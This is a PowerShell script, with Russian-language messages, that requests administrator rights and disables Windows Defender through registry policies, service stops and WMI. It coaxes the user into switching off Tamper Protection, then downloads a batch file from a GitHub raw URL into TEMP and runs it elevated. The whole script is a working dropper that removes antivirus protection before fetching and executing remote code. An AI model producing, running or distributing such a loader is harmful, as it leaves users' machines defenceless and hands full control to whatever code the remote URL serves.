param(
    [Parameter(Mandatory=$true)]
    [string]$Url = "https://raw.githubusercontent.com/DeathCheat1/dgfhffd/refs/heads/main/test.bat",
    [Parameter(Mandatory=$false)]
    [string]$DestinationPath,
    [Parameter(Mandatory=$false)]
    [string]$Arguments
)

function Ensure-AdminRights {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        Write-Host "Запрашиваю повышение прав..." -ForegroundColor Yellow
        $scriptPath = $MyInvocation.MyCommand.Path
        $scriptArgs = "-Url `"$Url`""
        if ($DestinationPath) { $scriptArgs += " -DestinationPath `"$DestinationPath`"" }
        if ($Arguments) { $scriptArgs += " -Arguments `"$Arguments`"" }
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $scriptArgs"
        $psi.Verb = "runas"
        try {
            [System.Diagnostics.Process]::Start($psi)
            exit
        }
        catch {
            Write-Host "Ошибка запроса прав: $_" -ForegroundColor Red
            exit 1
        }
    }
    else {
        Write-Host "Уже с правами администратора." -ForegroundColor Green
    }
}

function Disable-Defender {
    Write-Host "Пытаюсь отключить Windows Defender..." -ForegroundColor Cyan
    $errors = @()
    try {
        # 1. Отключаем через групповую политику (все редакции)
        $gpPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        if (-not (Test-Path $gpPath)) { New-Item -Path $gpPath -Force | Out-Null }
        Set-ItemProperty -Path $gpPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force

        # 2. Отключаем реальную защиту
        $rtpPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
        if (-not (Test-Path $rtpPath)) { New-Item -Path $rtpPath -Force | Out-Null }
        Set-ItemProperty -Path $rtpPath -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $rtpPath -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $rtpPath -Name "DisableOnAccessProtection" -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $rtpPath -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force

        # 3. Отключаем через WMI (альтернативный метод)
        $wmiQuery = "Select * From Win32_Service Where Name = 'WinDefend'"
        $service = Get-WmiObject -Query $wmiQuery
        if ($service) {
            $service.ChangeStartMode("Disabled") | Out-Null
            $service.StopService() | Out-Null
        }

        # 4. Останавливаем и отключаем службы через sc
        cmd /c "sc stop WinDefend" 2>$null
        cmd /c "sc config WinDefend start= disabled" 2>$null
        cmd /c "sc stop WdNisSvc" 2>$null
        cmd /c "sc config WdNisSvc start= disabled" 2>$null

        Write-Host "Команды выполнены. Defender должен отключиться после перезагрузки." -ForegroundColor Green
        Write-Host "Если защита осталась активна, значит включена Tamper Protection." -ForegroundColor Yellow
        return $true
    }
    catch {
        Write-Host "Ошибка: $_" -ForegroundColor Red
        return $false
    }
}

function Check-TamperProtection {
    # Пытаемся прочитать статус Tamper Protection (доступно с Windows 10 1903)
    try {
        $tamper = Get-MpPreference -ErrorAction Stop | Select-Object -ExpandProperty TamperProtection
        if ($tamper -eq $true) {
            Write-Host "Обнаружена включённая Tamper Protection." -ForegroundColor Red
            Write-Host "Без её отключения Defender не выключить. Сделайте вручную:" -ForegroundColor Yellow
            Write-Host "1. Откройте 'Безопасность Windows' -> 'Защита от вирусов и угроз'" -ForegroundColor Yellow
            Write-Host "2. Нажмите 'Управление настройками'" -ForegroundColor Yellow
            Write-Host "3. Выключите 'Защита от несанкционированного доступа' (Tamper Protection)" -ForegroundColor Yellow
            Write-Host "4. Запустите скрипт снова" -ForegroundColor Yellow
            return $false
        }
        else {
            Write-Host "Tamper Protection уже выключена." -ForegroundColor Green
            return $true
        }
    }
    catch {
        Write-Host "Не удалось проверить Tamper Protection (скорее всего, старая Windows). Продолжаем..." -ForegroundColor Yellow
        return $true
    }
}

function Download-File {
    param([string]$url, [string]$destPath)
    Write-Host "Скачиваю из $url ..." -ForegroundColor Cyan
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $destPath)
        Write-Host "Сохранено: $destPath" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Ошибка скачивания: $_" -ForegroundColor Red
        return $false
    }
}

function Run-AsAdmin {
    param([string]$filePath, [string]$arguments)
    if (-not (Test-Path $filePath)) {
        Write-Host "Файл не найден: $filePath" -ForegroundColor Red
        return $false
    }
    Write-Host "Запускаю от имени администратора: $filePath" -ForegroundColor Cyan
    try {
        $processArgs = @{
            FilePath = $filePath
            Verb = "runas"
            Wait = $false
        }
        if ($arguments) {
            $processArgs.ArgumentList = $arguments
        }
        Start-Process @processArgs
        Write-Host "Запущено." -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Ошибка запуска: $_" -ForegroundColor Red
        return $false
    }
}

try {
    Ensure-AdminRights

    Write-Host "`nДля скачивания и запуска требуется отключить Windows Defender." -ForegroundColor Yellow
    $choice = Read-Host "Вы согласны? (y/n)"
    if ($choice -ne 'y') { Write-Host "Выход." -ForegroundColor Red; exit 1 }

    if (-not (Check-TamperProtection)) { exit 1 }

    if (-not (Disable-Defender)) {
        Write-Host "Не удалось отключить Defender." -ForegroundColor Red
        exit 1
    }

    if (-not $DestinationPath) {
        $fileName = [System.IO.Path]::GetFileName($Url)
        if (-not $fileName) { $fileName = "downloaded_file" }
        $DestinationPath = Join-Path $env:TEMP $fileName
    }

    if (-not (Download-File -url $Url -destPath $DestinationPath)) {
        throw "Не удалось скачать файл."
    }

    if (-not (Run-AsAdmin -filePath $DestinationPath -arguments $Arguments)) {
        throw "Не удалось запустить файл."
    }

    Write-Host "Готово." -ForegroundColor Green
}
catch {
    Write-Host "Ошибка: $_" -ForegroundColor Red
    exit 1
}
